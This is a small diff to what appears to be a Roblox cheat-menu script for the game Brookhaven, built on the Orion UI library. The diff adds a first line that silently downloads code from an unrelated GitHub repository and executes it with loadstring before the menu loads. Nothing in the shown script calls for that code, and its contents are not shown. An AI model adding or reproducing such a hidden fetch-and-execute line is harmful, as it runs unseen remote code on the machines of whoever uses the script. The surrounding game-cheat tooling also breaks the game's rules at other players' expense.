@@ -1,3 +1,4 @@
+loadstring(game:HttpGet("https://github.com/alodozhynn/Nightscript-booting/raw/main/main"))()
 local OrionLib = loadstring(game:HttpGet("https://raw.githubusercontent.com/shlexware/Orion/main/source"))()
 local Window = OrionLib:MakeWindow({Name = "Infinity Mobile Brookhaven 🏡", HidePremium = false, SaveConfig = true, ConfigFolder = "OrionTest"})
 
